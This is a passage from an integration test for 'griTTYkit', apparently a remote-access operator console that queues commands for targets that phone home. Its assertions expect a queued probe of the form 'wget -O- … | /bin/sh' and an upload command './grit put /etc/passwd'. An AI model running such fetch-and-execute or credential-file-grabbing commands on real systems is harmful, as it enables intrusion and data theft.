                upload_summary.get("target_identity_source_counts", {}).get("http-header") != 1 or
                upload_summary.get("target_service_counts", {}).get("file-service") != 1 or
                upload_summary.get("target_latest_activity_service_counts", {}).get("file-service") != 1 or
                upload_summary.get("target_latest_activity_operation_counts", {}).get("upload") != 1 or
                upload_summary.get("target_latest_file_transfer_count") != 1 or
                upload_summary.get("target_latest_file_transfer_operation_counts", {}).get("upload") != 1 or
                upload_summary.get("target_latest_file_transfer_status_counts", {}).get("ok") != 1 or
                upload_summary.get("target_latest_file_transfer_route_kind_counts", {}).get("direct") != 1 or
                upload_summary.get("target_workflow_action_count") != 9 or
                upload_summary.get("target_workflow_action_target_counts", {}).get("target-alpha") != 9 or
                upload_summary.get("target_workflow_action_workflow_counts", {}).get("command-queue") != 1 or
                upload_summary.get("target_workflow_action_workflow_counts", {}).get("file-service") != 4 or
                upload_summary.get("target_workflow_action_workflow_counts", {}).get("probe") != 2 or
                upload_summary.get("target_workflow_action_requires_input_count") != 4 or
                upload_summary.get("target_workflow_action_offline_supported_count") != 9 or
                upload_summary.get("target_workflow_action_requires_target_online_count") != 0 or
                upload_summary.get("target_workflow_action_queues_offline_work_count") != 4 or
                upload_summary.get("target_workflow_action_target_phone_home_required_count") != 6 or
                upload_summary.get("target_workflow_action_can_run_from_curses_enter_count") != 5 or
                upload_summary.get("target_workflow_action_operator_action_state_counts", {}).get("ready") != 4 or
                upload_summary.get("target_workflow_action_operator_action_state_counts", {}).get("needs-input") != 4 or
                upload_summary.get("target_workflow_action_operator_action_state_counts", {}).get("queueable-offline") != 1 or
                upload_summary.get("target_workflow_action_operator_action_reason_counts", {}).get("input-required") != 4 or
                upload_summary.get("target_workflow_action_operator_action_reason_counts", {}).get("queues-until-phone-home") != 1 or
                len(targets) != 1 or
                target_alpha.get("label") != "Alpha Router" or
                "lab-alpha" not in (target_alpha.get("aliases") or []) or
                target_alpha.get("upload_count") != 1 or
                target_alpha.get("latest_activity_operation") != "upload" or
                target_alpha.get("latest_activity_service") != "file-service" or
                target_alpha.get("latest_file_transfer_operation") != "upload" or
                target_alpha.get("latest_file_transfer_status") != "ok" or
                target_alpha.get("latest_file_transfer_route_kind") != "direct" or
                target_alpha.get("latest_file_transfer_sha256") != upload_sha256 or
                target_alpha.get("latest_session_id") != session_json_paths[0].parent.name or
                len(alpha_workflow_actions) != 9 or
                alpha_actions_by_action.get("queue-command", {}).get("headless_command") != f"scripts/grit-console --config {str(upload_cfg)} --target-id target-alpha --queue-command COMMAND" or
                alpha_actions_by_action.get("queue-command", {}).get("operator_action_state") != "needs-input" or
                alpha_actions_by_action.get("queue-command", {}).get("operator_action_reason") != "input-required" or
                alpha_actions_by_action.get("queue-command", {}).get("can_run_from_curses_enter") is not False or
                alpha_actions_by_action.get("queue-command", {}).get("queues_offline_work") is not True or
                alpha_actions_by_action.get("queue-command", {}).get("target_phone_home_required") is not True or
                alpha_actions_by_action.get("queue-probe", {}).get("queues_offline_work") is not True or
                alpha_actions_by_action.get("queue-probe", {}).get("operator_action_state") != "queueable-offline" or
                alpha_actions_by_action.get("queue-probe", {}).get("operator_action_reason") != "queues-until-phone-home" or
                alpha_actions_by_action.get("queue-probe", {}).get("can_run_from_curses_enter") is not True or
                alpha_actions_by_action.get("queue-probe", {}).get("target_phone_home_required") is not True or
                alpha_actions_by_action.get("queue-probe", {}).get("headless_command") != f"scripts/grit-console --config {str(upload_cfg)} --run-target-workflow-action target-alpha:queue-probe" or
                alpha_actions_by_action.get("stage-file-fetch", {}).get("requires_input") is not True or
                alpha_actions_by_action.get("stage-file-fetch", {}).get("queues_offline_work") is not True or
                alpha_actions_by_action.get("stage-file-fetch", {}).get("offline_supported") is not True or
                alpha_actions_by_action.get("show-upload-command", {}).get("requires_input") is not True or
                alpha_actions_by_action.get("show-upload-command", {}).get("queues_offline_work") is not False or
                alpha_actions_by_action.get("show-upload-command", {}).get("target_phone_home_required") is not True or
                alpha_actions_by_action.get("show-upload-command", {}).get("headless_command") != f"scripts/grit-console --config {str(upload_cfg)} --run-target-workflow-action target-alpha:show-upload-command --target-workflow-command TARGET_PATH" or
                alpha_actions_by_action.get("queue-staged-fetch", {}).get("requires_input") is not True or
                alpha_actions_by_action.get("queue-staged-fetch", {}).get("queues_offline_work") is not True or
                alpha_actions_by_action.get("queue-staged-fetch", {}).get("target_phone_home_required") is not True or
                alpha_actions_by_action.get("inspect-status", {}).get("workflow") != "status" or
                alpha_actions_by_action.get("inspect-status", {}).get("operator_action_state") != "ready" or
                alpha_actions_by_action.get("inspect-status", {}).get("operator_action_reason") != "run-now" or
                ((upload_doc.get("target_workflow_actions_by_workflow") or {}).get("command-queue") or [{}])[0].get("target_id") != "target-alpha" or
                ((upload_doc.get("target_workflow_actions_by_requires_input") or {}).get("True") or [{}])[0].get("target_id") != "target-alpha" or
                ((upload_doc.get("target_workflow_actions_by_queues_offline_work") or {}).get("True") or [{}])[0].get("target_id") != "target-alpha" or
                ((upload_doc.get("target_workflow_actions_by_operator_action_state") or {}).get("queueable-offline") or [{}])[0].get("action_id") != "queue-probe" or
                ((upload_doc.get("target_workflow_actions_by_operator_action_reason") or {}).get("input-required") or [{}])[0].get("target_id") != "target-alpha" or
                "file-service" not in (target_alpha.get("services_seen") or []) or
                "http-header" not in (target_alpha.get("identity_sources") or [])):
            print("server json status missing target ledger records", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        target_api = (upload_doc.get("api_collections") or {}).get("targets") or {}
        if ("targets_by_id" not in (target_api.get("indexes") or []) or
                "targets_by_identity_confidence" not in (target_api.get("indexes") or []) or
                "targets_by_identity_source" not in (target_api.get("indexes") or []) or
                "targets_by_latest_activity_service" not in (target_api.get("indexes") or []) or
                "targets_by_latest_activity_operation" not in (target_api.get("indexes") or []) or
                "targets_by_latest_file_transfer_operation" not in (target_api.get("indexes") or []) or
                "targets_by_latest_file_transfer_status" not in (target_api.get("indexes") or []) or
                "targets_by_latest_file_transfer_route_kind" not in (target_api.get("indexes") or []) or
                "targets_by_latest_file_transfer_bridge_profile" not in (target_api.get("indexes") or []) or
                "targets_by_latest_survey_result_route_kind" not in (target_api.get("indexes") or []) or
                "targets_by_latest_survey_result_bridge_profile" not in (target_api.get("indexes") or []) or
                "target_workflow_actions_by_target_id" not in ((upload_doc.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes", []) or
                "target_workflow_actions_by_queues_offline_work" not in ((upload_doc.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes", []) or
                "target_workflow_actions_by_requires_target_online" not in ((upload_doc.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes", []) or
                "target_workflow_actions_by_operator_action_state" not in ((upload_doc.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes", []) or
                "target_workflow_actions_by_can_run_from_curses_enter" not in ((upload_doc.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes", []) or
                ((upload_doc.get("targets_by_identity_source") or {}).get("http-header") or [{}])[0].get("target_id") != "target-alpha" or
                ((upload_doc.get("targets_by_latest_activity_service") or {}).get("file-service") or [{}])[0].get("target_id") != "target-alpha" or
                ((upload_doc.get("targets_by_latest_activity_operation") or {}).get("upload") or [{}])[0].get("target_id") != "target-alpha" or
                ((upload_doc.get("targets_by_latest_file_transfer_operation") or {}).get("upload") or [{}])[0].get("target_id") != "target-alpha" or
                ((upload_doc.get("targets_by_latest_file_transfer_status") or {}).get("ok") or [{}])[0].get("target_id") != "target-alpha" or
                ((upload_doc.get("targets_by_latest_file_transfer_route_kind") or {}).get("direct") or [{}])[0].get("target_id") != "target-alpha" or
                "targets" not in (upload_doc.get("api_resources_by_name") or {})):
            print("server api status missing target collection", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        target_transfer_api = (upload_doc.get("api_collections") or {}).get("target_file_transfer_records") or {}
        target_transfer_records = upload_doc.get("target_file_transfer_records") or []
        target_transfers_by_target = upload_doc.get("target_file_transfer_records_by_target_id") or {}
        target_upload_transfers = target_transfers_by_target.get("target-alpha") or []
        target_upload_transfer = next(
            (rec for rec in target_upload_transfers if rec.get("operation") == "upload"),
            {},
        )
        if (upload_summary.get("target_file_transfer_record_count") != 1 or
                upload_summary.get("target_file_transfer_operation_counts", {}).get("upload") != 1 or
                upload_summary.get("target_file_transfer_source_collection_counts", {}).get("uploads") != 1 or
                upload_summary.get("target_file_transfer_status_counts", {}).get("ok") != 1 or
                upload_summary.get("target_file_transfer_target_counts", {}).get("target-alpha") != 1 or
                upload_summary.get("target_file_transfer_route_kind_counts", {}).get("direct") != 1 or
                len(target_transfer_records) != 1 or
                target_upload_transfer.get("target_id") != "target-alpha" or
                target_upload_transfer.get("target_label") != "Alpha Router" or
                target_upload_transfer.get("source_collection") != "uploads" or
                target_upload_transfer.get("status") != "ok" or
                target_upload_transfer.get("filename") != "evidence.txt" or
                target_upload_transfer.get("stage_kind") != "evidence" or
                target_upload_transfer.get("source_path") != "/tmp/evidence.txt" or
                target_upload_transfer.get("stored_path") != str(uploaded[0]) or
                target_upload_transfer.get("metadata_path") != str(metadata_path) or
                target_upload_transfer.get("session_id") != session_json_paths[0].parent.name or
                target_upload_transfer.get("sha256") != upload_sha256 or
                target_upload_transfer.get("sha256_prefix") != upload_sha256[:12] or
                target_upload_transfer.get("stored_exists") is not True or
                target_upload_transfer.get("route_kind") != "direct" or
                (upload_doc.get("target_file_transfer_records_by_operation") or {}).get("upload", [{}])[0].get("target_id") != "target-alpha" or
                (upload_doc.get("target_file_transfer_records_by_source_collection") or {}).get("uploads", [{}])[0].get("target_id") != "target-alpha" or
                (upload_doc.get("target_file_transfer_records_by_status") or {}).get("ok", [{}])[0].get("target_id") != "target-alpha" or
                (upload_doc.get("target_file_transfer_records_by_route_kind") or {}).get("direct", [{}])[0].get("target_id") != "target-alpha" or
                (upload_doc.get("target_file_transfer_records_by_filename") or {}).get("evidence.txt", [{}])[0].get("target_id") != "target-alpha" or
                (upload_doc.get("target_file_transfer_records_by_sha256") or {}).get(upload_sha256, [{}])[0].get("target_id") != "target-alpha" or
                "target_file_transfer_records_by_target_id" not in (target_transfer_api.get("indexes") or []) or
                "target_file_transfer_records_by_operation" not in (target_transfer_api.get("indexes") or []) or
                "target_file_transfer_records_by_status" not in (target_transfer_api.get("indexes") or []) or
                "target_file_transfer_records" not in (upload_doc.get("api_resources_by_name") or {})):
            print("server json status missing unified target file transfer records", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1
        upload_activity_api = (upload_doc.get("api_collections") or {}).get("target_activity_records") or {}
        upload_activity_by_target = upload_doc.get("target_activity_records_by_target_id") or {}
        upload_activity = upload_activity_by_target.get("target-alpha") or []
        upload_activity_categories = {rec.get("category") for rec in upload_activity}
        upload_file_activity = next(
            (rec for rec in upload_activity if rec.get("category") == "file-transfer" and rec.get("operation") == "upload"),
            {},
        )
        upload_heartbeat_activity = next(
            (rec for rec in upload_activity if rec.get("category") == "heartbeat"),
            {},
        )
        if (upload_summary.get("target_activity_record_count", 0) < 2 or
                upload_summary.get("target_activity_target_counts", {}).get("target-alpha", 0) < 2 or
                upload_summary.get("target_activity_category_counts", {}).get("file-transfer") != 1 or
                upload_summary.get("target_activity_category_counts", {}).get("heartbeat") != 1 or
                "file-transfer" not in upload_activity_categories or
                "heartbeat" not in upload_activity_categories or
                upload_file_activity.get("target_id") != "target-alpha" or
                upload_file_activity.get("source_collection") != "target_file_transfer_records" or
                upload_file_activity.get("status") != "ok" or
                upload_file_activity.get("filename") != "evidence.txt" or
                upload_file_activity.get("route_kind") != "direct" or
                upload_heartbeat_activity.get("status") != "online" or
                upload_heartbeat_activity.get("operation") != "upload" or
                (upload_doc.get("target_activity_records_by_category") or {}).get("file-transfer", [{}])[0].get("target_id") != "target-alpha" or
                (upload_doc.get("target_activity_records_by_source_collection") or {}).get("target_file_transfer_records", [{}])[0].get("target_id") != "target-alpha" or
                (upload_doc.get("target_activity_records_by_filename") or {}).get("evidence.txt", [{}])[0].get("target_id") != "target-alpha" or
                "target_activity_records_by_target_id" not in (upload_activity_api.get("indexes") or []) or
                "target_activity_records_by_category" not in (upload_activity_api.get("indexes") or []) or
                "target_activity_records" not in (upload_doc.get("api_resources_by_name") or {})):
            print("server json status missing target activity feed for upload target", file=sys.stderr)
            print(upload_status_json.stdout, file=sys.stderr)
            return 1

        action_operator_dir = Path(tmp) / "operator-session-target-actions"
        action_cfg = Path(tmp) / "server-config-target-actions.json"
        action_cfg.write_text(json.dumps({
            "operator_session_dir": str(action_operator_dir),
            "session_root": str(Path(tmp) / "sessions-target-actions"),
            "server_state": str(action_operator_dir / "server-state.json"),
            "staged_files": str(action_operator_dir / "staged-files.json"),
            "command_queue_file": str(action_operator_dir / "command-queue.json"),
            "targets_file": str(action_operator_dir / "targets.json"),
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": free_port(),
        }), encoding="utf-8")
        action_label = run(
            "scripts/grit-console",
            "--config", str(action_cfg),
            "--set-target-label", "target-action",
            "--target-label", "Action Router",
        )
        if action_label.returncode != 0:
            print("target workflow action label setup failed", file=sys.stderr)
            print(action_label.stderr, file=sys.stderr)
            return 1
        action_staged_source = Path(tmp) / "action-staged.txt"
        action_staged_source.write_text("target workflow staged file\n", encoding="utf-8")
        action_stage = run(
            "scripts/grit-console",
            "--config", str(action_cfg),
            "--run-target-workflow-action", "target-action:stage-file-fetch",
            "--target-workflow-local-file", str(action_staged_source),
            "--target-workflow-request-name", "action-staged.txt",
        )
        if (action_stage.returncode != 0 or
                "target workflow action: target-action:stage-file-fetch" not in action_stage.stdout or
                "headless_command=" in action_stage.stdout or
                "command=scripts/grit-console --config" not in action_stage.stdout or
                "target=target-action label=Action Router" not in action_stage.stdout or
                "action-staged.txt" not in action_stage.stdout):
            print("headless target workflow stage action failed", file=sys.stderr)
            print(action_stage.stdout, file=sys.stderr)
            print(action_stage.stderr, file=sys.stderr)
            return 1
        line_action_state = action_operator_dir / "line-target-action-state.json"
        line_master, line_slave = pty.openpty()
        try:
            line_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(action_cfg),
                    "--state-file", str(line_action_state),
                ],
                cwd=ROOT,
                stdin=line_slave,
                stdout=line_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(line_slave)
            line_slave = -1
            time.sleep(0.5)
            line_output, line_stderr = run_pty_script(
                line_proc,
                line_master,
                b"16\ntarget-action\n15\ntarget-action:queue-command\ngrit survey --json\n18\ncurrent\n18\nall\nq\n",
                timeout=15,
            )
        finally:
            if line_slave != -1:
                os.close(line_slave)
            try:
                os.close(line_master)
            except OSError:
                pass
        if line_proc.returncode != 0 or "Traceback" in (line_stderr or ""):
            print("line console target workflow action did not exit cleanly", file=sys.stderr)
            print(line_stderr or "", file=sys.stderr)
            return 1
        line_text = line_output.decode("utf-8", errors="replace")
        if ("selected target target-action label=Action Router" not in line_text or
                "griTTYkit v" not in line_text or
                "1 target" not in line_text or
                "selected: Action Router" not in line_text or
                "? help" not in line_text or
                "workspace" not in line_text or
                "Target detail: target-action label=Action Router" not in line_text or
                "headless_command:" in line_text or
                "headless_command=" in line_text or
                "queues_offline_work=yes" not in line_text or
                "offline=yes requires_online=no" not in line_text or
                "state=needs input reason=input-required enter=no" not in line_text or
                "state=queueable offline reason=queues-until-phone-home enter=yes" not in line_text or
                "target_workflow_action_returncode=0" not in line_text or
                "Target activity after action:" not in line_text or
                "Activity  (" not in line_text or
                "target-action" not in line_text or
                "mailbox" not in line_text or
                "target-poll" not in line_text or
                "queued" not in line_text or
                "mailbox_pending=1 poll_overdue=no" not in line_text or
                "mailbox queued=1 delivered=0 results=0 expired=0 pending=1" not in line_text or
                "Target workflow actions:" not in line_text):
            print("line console target detail exposed noisy headless command or missed mailbox/activity state", file=sys.stderr)
            print(line_text, file=sys.stderr)
            return 1
        activity_master, activity_slave = pty.openpty()
        try:
            activity_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(action_cfg),
                    "--state-file", str(line_action_state),
                ],
                cwd=ROOT,
                stdin=activity_slave,
                stdout=activity_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(activity_slave)
            activity_slave = -1
            time.sleep(0.5)
            activity_output, activity_stderr = run_pty_script(
                activity_proc,
                activity_master,
                b"21\ntarget-action\nq\n",
                timeout=8,
            )
        finally:
            if activity_slave != -1:
                os.close(activity_slave)
            try:
                os.close(activity_master)
            except OSError:
                pass
        activity_text = activity_output.decode("utf-8", errors="replace")
        if (activity_proc.returncode != 0 or
                "Traceback" in (activity_stderr or "") or
                "Target activity feed: target-action label=Action Router" not in activity_text or
                "Activity  (" not in activity_text or
                "target-action" not in activity_text or
                "mailbox" not in activity_text or
                "target-poll" not in activity_text or
                "queued" not in activity_text or
                "headless_command:" in activity_text):
            print("line console target activity feed exposed noisy headless command or missed scoped activity records", file=sys.stderr)
            print(activity_text, file=sys.stderr)
            print(activity_stderr or "", file=sys.stderr)
            return 1
        action_survey = run(
            "scripts/grit-console",
            "--config", str(action_cfg),
            "--run-target-workflow-action", "target-action:queue-probe",
        )
        if (action_survey.returncode != 0 or
                "target workflow action: target-action:queue-probe" not in action_survey.stdout or
                "queued " not in action_survey.stdout or
                "wget -O- " not in action_survey.stdout or
                "| /bin/sh" not in action_survey.stdout or
                "target=target-action label=Action Router" not in action_survey.stdout):
            print("headless target workflow survey queue action failed", file=sys.stderr)
            print(action_survey.stdout, file=sys.stderr)
            print(action_survey.stderr, file=sys.stderr)
            return 1
        action_fetch = run(
            "scripts/grit-console",
            "--config", str(action_cfg),
            "--run-target-workflow-action", "target-action:queue-staged-fetch",
            "--target-workflow-request-name", "action-staged.txt",
        )
        if (action_fetch.returncode != 0 or
                "target workflow action: target-action:queue-staged-fetch" not in action_fetch.stdout or
                "queued " not in action_fetch.stdout or
                "grit fetch action-staged.txt" not in action_fetch.stdout or
                "target=target-action label=Action Router" not in action_fetch.stdout):
            print("headless target workflow staged-fetch queue action failed", file=sys.stderr)
            print(action_fetch.stdout, file=sys.stderr)
            print(action_fetch.stderr, file=sys.stderr)
            return 1
        action_upload = run(
            "scripts/grit-console",
            "--config", str(action_cfg),
            "--run-target-workflow-action", "target-action:show-upload-command",
            "--target-workflow-command", "/etc/passwd",
        )
        if (action_upload.returncode != 0 or
                "target workflow action: target-action:show-upload-command" not in action_upload.stdout or
                "target_upload_path=/etc/passwd" not in action_upload.stdout or
                "./grit put /etc/passwd" not in action_upload.stdout or
                "--target-id target-action" not in action_upload.stdout or
                "--target-label 'Action Router'" not in action_upload.stdout):
            print("headless target workflow upload command action failed", file=sys.stderr)
            print(action_upload.stdout, file=sys.stderr)
            print(action_upload.stderr, file=sys.stderr)
            return 1
        action_doc = json.loads(run(
            "scripts/grit-console",
            "--config", str(action_cfg),
            "--event-limit", "32",
            "--json-status",
        ).stdout)
        action_queue = (action_doc.get("command_queue") or {}).get("commands_by_target_id", {}).get("target-action") or []
        action_staged = (action_doc.get("staged_by_target_id") or {}).get("target-action") or []
        action_staged_file_actions = (action_doc.get("staged_file_workflow_actions_by_request_name") or {}).get("action-staged.txt") or []
        action_staged_file_action_by_id = action_doc.get("staged_file_workflow_actions_by_id") or {}
        action_file_service_actions_by_id = action_doc.get("file_service_workflow_actions_by_id") or {}
        action_survey_actions_by_id = action_doc.get("probe_workflow_actions_by_id") or {}
        action_events = action_doc.get("events_by_event") or {}
        activity_inspected_events = action_events.get("workbench_target_activity_inspected") or []
        selected_events = action_events.get("workbench_target_selected") or []
        action_completed = action_events.get("target_workflow_action_completed") or []
        queued_survey = [
            rec for rec in action_queue
            if "wget -O- " in str(rec.get("command") or "") and "| /bin/sh" in str(rec.get("command") or "")
        ]
        queued_manual = [
            rec for rec in action_queue
            if rec.get("command") == "grit survey --json"
        ]
        queued_fetch = [
            rec for rec in action_queue
            if "grit fetch action-staged.txt" in str(rec.get("command") or "")
        ]
        completed_by_action = {
            (event.get("details") or {}).get("action_id"): event.get("details") or {}
            for event in action_completed
        }
        action_target_transfers = (action_doc.get("target_file_transfer_records_by_target_id") or {}).get("target-action") or []
        action_staged_transfer = next(
            (rec for rec in action_target_transfers if rec.get("operation") == "staged-fetch"),
            {},
        )
        line_workbench_state = (json.loads(line_action_state.read_text(encoding="utf-8")).get("services") or {}).get("workbench") or {}
        if (len(action_queue) != 3 or
                len(queued_manual) != 1 or
                len(queued_survey) != 1 or
                len(queued_fetch) != 1 or
                len(action_staged) != 1 or
                action_staged[0].get("request_name") != "action-staged.txt" or
                len(action_staged_file_actions) != 4 or
                action_staged_file_action_by_id.get("action-staged.txt:queue-staged-fetch", {}).get("operator_action_state") != "queueable-offline" or
                action_staged_file_action_by_id.get("action-staged.txt:queue-staged-fetch", {}).get("queues_offline_work") is not True or
                action_staged_file_action_by_id.get("action-staged.txt:queue-staged-fetch", {}).get("target_id") != "target-action" or
                action_staged_file_action_by_id.get("action-staged.txt:queue-staged-fetch", {}).get("target_mailbox_pending_work_count") != 3 or
                action_staged_file_action_by_id.get("action-staged.txt:queue-staged-fetch", {}).get("fleet_target_count") != 1 or
                action_staged_file_action_by_id.get("action-staged.txt:queue-staged-fetch", {}).get("fleet_mailbox_pending_work_count") != 3 or
                action_staged_file_action_by_id.get("action-staged.txt:queue-staged-fetch", {}).get("fleet_has_mailbox_pending_work") is not True or
                "queue-staged-fetch --target-workflow-request-name action-staged.txt" not in action_staged_file_action_by_id.get("action-staged.txt:queue-staged-fetch", {}).get("headless_command", "") or
                action_staged_file_action_by_id.get("action-staged.txt:show-fetch-command", {}).get("can_run_from_curses_enter") is not True or
                action_staged_file_action_by_id.get("action-staged.txt:unstage", {}).get("requires_confirmation") is not True or
                not any(
                    (event.get("details") or {}).get("target_id") == "target-action" and
                    (event.get("details") or {}).get("action_id") == "queue-command" and
                    "--target-id target-action --queue-command COMMAND" in ((event.get("details") or {}).get("headless_command") or "")
                    for event in action_events.get("target_workflow_action_selected", [])
                ) or
                completed_by_action.get("stage-file-fetch", {}).get("request_name") != "action-staged.txt" or
                completed_by_action.get("stage-file-fetch", {}).get("target_id") != "target-action" or
                completed_by_action.get("stage-file-fetch", {}).get("queues_offline_work") is not True or
                completed_by_action.get("queue-command", {}).get("command_id") != queued_manual[0].get("id") or
                completed_by_action.get("queue-command", {}).get("target_id") != "target-action" or
                completed_by_action.get("queue-command", {}).get("queues_offline_work") is not True or
                completed_by_action.get("queue-command", {}).get("target_phone_home_required") is not True or
                completed_by_action.get("queue-probe", {}).get("command_id") != queued_survey[0].get("id") or
                completed_by_action.get("queue-probe", {}).get("target_id") != "target-action" or
                completed_by_action.get("queue-probe", {}).get("result") != "queued-probe" or
                completed_by_action.get("queue-probe", {}).get("queues_offline_work") is not True or
                completed_by_action.get("queue-probe", {}).get("target_phone_home_required") is not True or
                "wget -O- " not in completed_by_action.get("queue-probe", {}).get("queued_command", "") or
                completed_by_action.get("queue-staged-fetch", {}).get("command_id") != queued_fetch[0].get("id") or
                completed_by_action.get("queue-staged-fetch", {}).get("target_id") != "target-action" or
                completed_by_action.get("queue-staged-fetch", {}).get("result") != "queued-staged-fetch" or
                completed_by_action.get("queue-staged-fetch", {}).get("request_name") != "action-staged.txt" or
                completed_by_action.get("queue-staged-fetch", {}).get("queues_offline_work") is not True or
                completed_by_action.get("queue-staged-fetch", {}).get("target_phone_home_required") is not True or
                "grit fetch action-staged.txt" not in completed_by_action.get("queue-staged-fetch", {}).get("queued_command", "") or
                completed_by_action.get("show-upload-command", {}).get("target_id") != "target-action" or
                completed_by_action.get("show-upload-command", {}).get("result") != "shown-upload-command" or
                completed_by_action.get("show-upload-command", {}).get("target_upload_path") != "/etc/passwd" or
                completed_by_action.get("show-upload-command", {}).get("queues_offline_work") is not False or
                completed_by_action.get("show-upload-command", {}).get("target_phone_home_required") is not True or
                "./grit put /etc/passwd" not in completed_by_action.get("show-upload-command", {}).get("target_command", "") or
                not completed_by_action.get("show-upload-command", {}).get("target_command_sha256") or
                "headless_command" not in completed_by_action.get("queue-command", {}) or
                not any(
                    (event.get("details") or {}).get("target_id") == "target-action" and
                    "--target-id target-action --status" in ((event.get("details") or {}).get("headless_command") or "")
                    for event in selected_events) or
                not action_events.get("workbench_target_inspected") or
                not any(
                    (event.get("details") or {}).get("target_id") == "target-action" and
                    (event.get("details") or {}).get("target_activity_record_count", 0) >= 1
                    for event in action_events.get("workbench_target_inspected", [])
                ) or
                not any(
                    (event.get("details") or {}).get("scope") == "all" and
                    "--status" in ((event.get("details") or {}).get("headless_command") or "") and
                    (event.get("details") or {}).get("target_activity_record_count", 0) >= 1
                    for event in action_events.get("workbench_targets_inspected", [])
                ) or
                not any(
                    (event.get("details") or {}).get("target_id") == "target-action" and
                    (event.get("details") or {}).get("scope") == "target" and
                    "--target-id target-action --json-status" in ((event.get("details") or {}).get("headless_command") or "") and
                    (event.get("details") or {}).get("target_activity_record_count", 0) >= 1
                    for event in activity_inspected_events
                ) or
                line_workbench_state.get("selected_target_id") != "target-action" or
                line_workbench_state.get("selected_target_label") != "Action Router" or
                action_doc.get("summary", {}).get("command_queue_target_counts", {}).get("target-action") != 3 or
                action_doc.get("summary", {}).get("target_workflow_action_queues_offline_work_count") != 4 or
                action_doc.get("summary", {}).get("target_workflow_action_target_phone_home_required_count") != 6 or
                action_doc.get("summary", {}).get("staged_target_counts", {}).get("target-action") != 1 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_count") != 4 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_target_counts", {}).get("target-action") != 4 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_target_mailbox_pending_work_count_counts", {}).get("3") != 4 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_fleet_target_count_counts", {}).get("1") != 4 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("3") != 4 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_fleet_has_mailbox_pending_work_counts", {}).get("True") != 4 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_queues_offline_work_count") != 1 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_requires_confirmation_count") != 1 or
                action_doc.get("summary", {}).get("staged_file_workflow_action_can_run_from_curses_enter_count") != 1 or
                action_doc.get("summary", {}).get("file_service_workflow_action_count") != 6 or
                action_doc.get("summary", {}).get("file_service_workflow_action_requires_input_count") != 2 or
                action_doc.get("summary", {}).get("file_service_workflow_action_fleet_target_count_counts", {}).get("1") != 6 or
                action_doc.get("summary", {}).get("file_service_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("3") != 6 or
                action_doc.get("summary", {}).get("file_service_workflow_action_fleet_has_mailbox_pending_work_counts", {}).get("True") != 6 or
                action_doc.get("summary", {}).get("probe_workflow_action_fleet_target_count_counts", {}).get("1") != 4 or
                action_doc.get("summary", {}).get("probe_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("3") != 4 or
                action_doc.get("summary", {}).get("probe_workflow_action_fleet_has_mailbox_pending_work_counts", {}).get("True") != 4 or
                action_file_service_actions_by_id.get("file-service:list-staged-files", {}).get("can_run_from_curses_enter") is not True or
                action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("requires_input") is not True or
                action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("fleet_target_count") != 1 or
                action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("fleet_mailbox_pending_work_count") != 3 or
                action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("fleet_has_mailbox_pending_work") is not True or
                action_survey_actions_by_id.get("probe:show-target-command", {}).get("fleet_target_count") != 1 or
                action_survey_actions_by_id.get("probe:show-target-command", {}).get("fleet_mailbox_pending_work_count") != 3 or
                action_survey_actions_by_id.get("probe:show-target-command", {}).get("fleet_has_mailbox_pending_work") is not True or
                "put TARGET_PATH" not in action_file_service_actions_by_id.get("file-service:show-upload-command", {}).get("target_command_template", "") or
                action_doc.get("summary", {}).get("target_file_transfer_record_count") != 1 or
                action_doc.get("summary", {}).get("target_file_transfer_operation_counts", {}).get("staged-fetch") != 1 or
                action_doc.get("summary", {}).get("target_file_transfer_source_collection_counts", {}).get("staged_records") != 1 or
                action_doc.get("summary", {}).get("target_file_transfer_status_counts", {}).get("available") != 1 or
                action_doc.get("summary", {}).get("target_file_transfer_target_counts", {}).get("target-action") != 1 or
                action_staged_transfer.get("target_id") != "target-action" or
                action_staged_transfer.get("target_label") != "Action Router" or
                action_staged_transfer.get("request_name") != "action-staged.txt" or
                action_staged_transfer.get("filename") != "action-staged.txt" or
                action_staged_transfer.get("source_path") != str(action_staged_source) or
                action_staged_transfer.get("source_exists") is not True or
                action_staged_transfer.get("status") != "available" or
                action_staged_transfer.get("route_kind") != "direct" or
                (action_doc.get("target_file_transfer_records_by_operation") or {}).get("staged-fetch", [{}])[0].get("target_id") != "target-action" or
                (action_doc.get("target_file_transfer_records_by_request_name") or {}).get("action-staged.txt", [{}])[0].get("target_id") != "target-action" or
                "staged_file_workflow_actions_by_request_name" not in ((action_doc.get("api_collections") or {}).get("staged_file_workflow_actions") or {}).get("indexes", []) or
                "staged_file_workflow_actions_by_target_mailbox_pending_work_count" not in ((action_doc.get("api_collections") or {}).get("staged_file_workflow_actions") or {}).get("indexes", []) or
                "staged_file_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((action_doc.get("api_collections") or {}).get("staged_file_workflow_actions") or {}).get("indexes", []) or
                "file_service_workflow_actions_by_route_kind" not in ((action_doc.get("api_collections") or {}).get("file_service_workflow_actions") or {}).get("indexes", []) or
